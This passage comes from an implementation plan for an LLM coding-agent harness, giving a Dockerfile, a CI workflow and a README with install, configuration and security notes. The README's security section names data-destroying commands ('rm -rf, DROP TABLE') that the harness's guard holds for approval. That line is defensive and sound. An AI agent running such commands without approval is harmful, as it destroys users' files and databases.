  process.exit(failed > 0 ? 1 : 0);
}

main().catch(console.error);
```

- [ ] **Step 6: Run demo tests to verify**

```bash
npx vitest run tests/demos.test.ts
```
Expected: 3 tests PASS.

- [ ] **Step 7: Commit**

```bash
git add demos/ tests/demos.test.ts
git commit -m "feat: add mechanism demos for guard, feedback, and memory"
```

---

### Task 21: Docker and CI Configuration

**Files:**
- Create: `Dockerfile`, `.github/workflows/ci.yml`
- Modify: `.gitignore`

- [ ] **Step 1: Create Dockerfile**

```dockerfile
FROM node:20-alpine AS builder
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci
COPY tsconfig.json ./
COPY src/ ./src/
RUN npm run build

FROM node:20-alpine
WORKDIR /app
COPY --from=builder /app/dist/ ./dist/
COPY --from=builder /app/node_modules/ ./node_modules/
COPY package.json ./
ENTRYPOINT ["node", "dist/index.js"]
```

- [ ] **Step 2: Create .github/workflows/ci.yml**

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  unit-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'
      - run: npm ci
      - run: npm test

  build:
    needs: unit-test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'
      - run: npm ci
      - run: npm run build
      - name: Build Docker image
        run: docker build -t coding-agent-harness .
```

- [ ] **Step 3: Verify Docker build**

```bash
docker build -t coding-agent-harness .
```
Expected: builds successfully.

- [ ] **Step 4: Commit**

```bash
git add Dockerfile .github/workflows/ci.yml
git commit -m "feat: add Dockerfile and CI workflow"
```

---

### Task 22: README

**Files:**
- Create: `README.md`

- [ ] **Step 1: Create README.md**

```markdown
# Coding Agent Harness

A TypeScript/Node.js Coding Agent Harness that enables AI to autonomously modify code, run tests, and self-correct based on test results.

## Architecture

```
Agent = LLM + Harness

Harness = Context Assembler -> LLM Call -> Action Parser -> Guard -> Executor -> Feedback -> Loop
```

## Installation

### npm

\`\`\`bash
npm install -g coding-agent-harness
\`\`\`

### Docker

\`\`\`bash
docker build -t coding-agent-harness .
docker run -v $(pwd):/workspace -e OPENAI_API_KEY=$OPENAI_API_KEY coding-agent-harness run "your task"
\`\`\`

## Usage

\`\`\`bash
harness run "Implement a calculator function with tests"
\`\`\`

## API Key Configuration

### Secure (Recommended)

Use \`harness key set\` to store keys in your OS keychain:

\`\`\`bash
harness key set openai
\`\`\`

### Environment Variables (Fallback)

Set the following environment variables. Note: these are stored in plaintext in your shell environment.

- \`OPENAI_API_KEY\`
- \`ANTHROPIC_API_KEY\`
- \`OPENAI_COMPAT_API_KEY\`

## Configuration

Create \`.harnessrc.json\` in your project root:

\`\`\`json
{
  "llm": { "provider": "openai", "model": "gpt-4o", "maxTokens": 4096 },
  "loop": { "maxIterations": 50, "maxConsecutiveFailures": 3 },
  "tools": { "workspaceRoot": "." }
}
\`\`\`

## Directory Structure

\`\`\`
src/
  index.ts              - CLI entry
  types.ts              - Shared types
  core/
    loop.ts             - Main agent loop
    parser.ts           - Action parser
    guard.ts            - Guardrail system
    executor.ts         - Action executor
    feedback.ts         - Feedback validator
    llm/                - LLM abstraction (mock, OpenAI, Anthropic, compat)
  memory/               - Memory system (L1/L2/L3)
  tools/                - Tool implementations (read/write/shell/test)
  config/               - Configuration loader
  credentials/          - Credential management
tests/                  - Unit tests (mock LLM driven)
demos/                  - Mechanism demonstrations
\`\`\`

## Testing

\`\`\`bash
npm test                # Run all tests
npm run demo:guard      # Guardrail demo
npm run demo:feedback   # Feedback loop demo
npm run demo:memory     # Memory system demo
\`\`\`

## Security

- API keys are stored in the OS keychain (Windows Credential Manager / macOS Keychain / Linux Secret Service)
- Dangerous commands (rm -rf, DROP TABLE, etc.) require user approval before execution
- File operations are restricted to the workspace directory
- Keys are never logged or committed to Git

## Known Limitations

- keytar may not be available on all Linux distributions (falls back to env vars)
- better-sqlite3 requires native compilation (prebuilt binaries available for most platforms)
- L3 vector storage uses in-memory Float32Array; not suitable for very large codebases
```

- [ ] **Step 2: Commit**

```bash
git add README.md
git commit -m "docs: add README with installation, usage, and security notes"
```

